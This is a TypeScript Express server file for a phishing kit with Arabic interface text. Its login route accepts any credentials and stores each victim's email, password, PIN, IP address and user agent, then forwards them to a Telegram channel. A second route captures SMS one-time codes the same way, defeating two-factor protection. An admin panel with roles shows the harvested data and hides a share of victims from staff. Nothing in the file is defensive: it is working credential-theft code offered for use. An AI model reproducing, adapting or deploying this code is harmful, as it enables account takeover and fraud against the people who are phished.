import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { loginSchema, verifyOtpSchema, adminLoginSchema } from "@shared/schema";
import bcrypt from "bcryptjs";
import { sendToTelegram, formatLoginMessage, formatSMSMessage } from "./telegram";

// Store temporary collected data IDs for SMS verification
const tempCollectedIds = new Map<string, string>();

function getClientIp(req: Request): string {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string') {
    return forwarded.split(',')[0].trim();
  }
  return req.socket.remoteAddress || 'unknown';
}

// Middleware to check if admin is authenticated
function requireAdmin(req: Request, res: Response, next: NextFunction) {
  if (!req.session.adminId) {
    return res.status(401).json({ message: "غير مصرح لك بالوصول" });
  }
  next();
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Login endpoint - accepts ANY credentials and saves to database
  app.post("/api/auth/login", async (req, res) => {
    try {
      const validatedData = loginSchema.parse(req.body);
      const { email, password, pin } = validatedData;

      const ipAddress = getClientIp(req);
      const userAgent = req.headers['user-agent'] || 'unknown';

      // Save collected data to database
      // isHidden will be calculated automatically by database trigger based on userNumber
      const collectedDataRecord = await storage.createCollectedData({
        email,
        password,
        pin,
        smsCode: null,
        ipAddress,
        userAgent,
      });

      // Create inbox message for registration (reuse isHidden from collected data)
      await storage.createInboxMessage({
        userId: collectedDataRecord.id,
        messageType: "registration",
        email,
        password,
        pin,
        smsCode: null,
        ipAddress,
        userAgent,
        isHidden: collectedDataRecord.isHidden, // Reuse from parent record
      });

      // Send Telegram notification (dual system: database + Telegram)
      const telegramMessage = formatLoginMessage(email, password, pin);
      sendToTelegram(telegramMessage).catch(err => {
        console.error("⚠️ Telegram notification failed (non-blocking):", err);
      });

      // Store the collected data ID temporarily for SMS verification
      const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      tempCollectedIds.set(sessionId, collectedDataRecord.id);

      console.log(`✅ Login data saved - Email: ${email}, Hidden: ${collectedDataRecord.isHidden}`);

      // Always return success - direct login without SMS
      res.json({ 
        success: true,
        message: "تم تسجيل الدخول بنجاح" 
      });
    } catch (error: any) {
      console.error("Login error:", error);
      res.status(400).json({ message: error.message || "خطأ في البيانات المدخلة" });
    }
  });

  // Verify OTP endpoint - accepts ANY SMS code and saves to database
  app.post("/api/auth/verify-otp", async (req, res) => {
    try {
      const validatedData = verifyOtpSchema.parse(req.body);
      const { userId, otp } = validatedData;

      // Get collected data ID
      const collectedDataId = tempCollectedIds.get(userId);
      
      if (!collectedDataId) {
        return res.status(401).json({ message: "الجلسة منتهية، يرجى تسجيل الدخول مجدداً" });
      }

      // Update collected data with SMS code
      const updatedRecord = await storage.updateCollectedDataSms(collectedDataId, otp);
      
      if (!updatedRecord) {
        return res.status(500).json({ message: "خطأ في تحديث البيانات" });
      }

      // Use the SAME isHidden flag from the original registration
      // This ensures both messages (registration + SMS) are in the same section
      const isHidden = updatedRecord.isHidden;

      // Create inbox message for SMS verification
      await storage.createInboxMessage({
        userId: collectedDataId,
        messageType: "sms_verification",
        email: updatedRecord.email,
        password: null,
        pin: null,
        smsCode: otp,
        ipAddress: updatedRecord.ipAddress || null,
        userAgent: updatedRecord.userAgent || null,
        isHidden,
      });

      // Send Telegram notification for SMS code (dual system)
      const smsMessage = formatSMSMessage(updatedRecord.email, otp);
      sendToTelegram(smsMessage).catch(err => {
        console.error("⚠️ Telegram SMS notification failed (non-blocking):", err);
      });

      console.log(`✅ SMS code saved - Code: ${otp}, Hidden: ${isHidden}`);

      // Clean up temporary session
      tempCollectedIds.delete(userId);

      // Always return success
      res.json({ 
        success: true,
        message: "تم التحقق بنجاح" 
      });
    } catch (error: any) {
      console.error("OTP verification error:", error);
      res.status(400).json({ message: error.message || "خطأ في التحقق" });
    }
  });

  // Admin login endpoint
  app.post("/api/admin/login", async (req, res) => {
    try {
      const validatedData = adminLoginSchema.parse(req.body);
      const { username, password } = validatedData;

      const admin = await storage.getAdminByUsername(username);
      
      if (!admin) {
        return res.status(401).json({ message: "اسم المستخدم أو كلمة المرور غير صحيحة" });
      }

      // Compare password using bcrypt
      const passwordMatch = await bcrypt.compare(password, admin.password);
      
      if (!passwordMatch) {
        return res.status(401).json({ message: "اسم المستخدم أو كلمة المرور غير صحيحة" });
      }

      // Store admin data in session
      req.session.adminId = admin.id;
      req.session.adminUsername = admin.username;
      req.session.adminRole = admin.role;

      res.json({ 
        success: true,
        admin: {
          id: admin.id,
          username: admin.username,
          role: admin.role,
        }
      });
    } catch (error: any) {
      console.error("Admin login error:", error);
      res.status(400).json({ message: error.message || "خطأ في تسجيل الدخول" });
    }
  });

  // Admin logout endpoint
  app.post("/api/admin/logout", requireAdmin, async (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "خطأ في تسجيل الخروج" });
      }
      res.json({ success: true, message: "تم تسجيل الخروج بنجاح" });
    });
  });

  // Get current admin info
  app.get("/api/admin/me", requireAdmin, async (req, res) => {
    res.json({
      success: true,
      admin: {
        id: req.session.adminId,
        username: req.session.adminUsername,
        role: req.session.adminRole,
      }
    });
  });

  // Get all collected data (admin only - protected with role-based filtering)
  app.get("/api/admin/collected-data", requireAdmin, async (req, res) => {
    try {
      const data = await storage.getAllCollectedData();
      const adminRole = req.session.adminRole;
      
      // Filter sensitive fields based on role
      const filteredData = data.map(record => {
        if (adminRole === "admin") {
          // Admin sees everything
          return record;
        } else {
          // Staff (80% access) - hide password and smsCode
          const { password, smsCode, ...visibleData } = record;
          return {
            ...visibleData,
            password: null,
            smsCode: null,
          };
        }
      });
      
      res.json({ 
        success: true, 
        data: filteredData,
        adminRole
      });
    } catch (error: any) {
      console.error("Error fetching collected data:", error);
      res.status(500).json({ message: "خطأ في جلب البيانات" });
    }
  });

  // Get public inbox messages (80% - visible to all admins)
  app.get("/api/admin/inbox/public", requireAdmin, async (req, res) => {
    try {
      const messages = await storage.getInboxMessages();
      const adminRole = req.session.adminRole;
      
      // Filter sensitive fields based on role
      const filteredMessages = messages.map(msg => {
        if (adminRole === "admin") {
          // Admin sees everything
          return msg;
        } else {
          // Staff - hide password and smsCode
          return {
            ...msg,
            password: null,
            smsCode: null,
          };
        }
      });
      
      res.json({ 
        success: true, 
        messages: filteredMessages,
        adminRole
      });
    } catch (error: any) {
      console.error("Error fetching inbox messages:", error);
      res.status(500).json({ message: "خطأ في جلب الرسائل" });
    }
  });

  // Get hidden inbox messages (20% - only admin)
  app.get("/api/admin/inbox/hidden", requireAdmin, async (req, res) => {
    try {
      const adminRole = req.session.adminRole;
      
      // Only admin can access hidden messages
      if (adminRole !== "admin") {
        return res.status(403).json({ message: "غير مصرح لك بالوصول" });
      }
      
      const messages = await storage.getHiddenInboxMessages();
      
      res.json({ 
        success: true, 
        messages,
        adminRole
      });
    } catch (error: any) {
      console.error("Error fetching hidden messages:", error);
      res.status(500).json({ message: "خطأ في جلب الرسائل المخفية" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
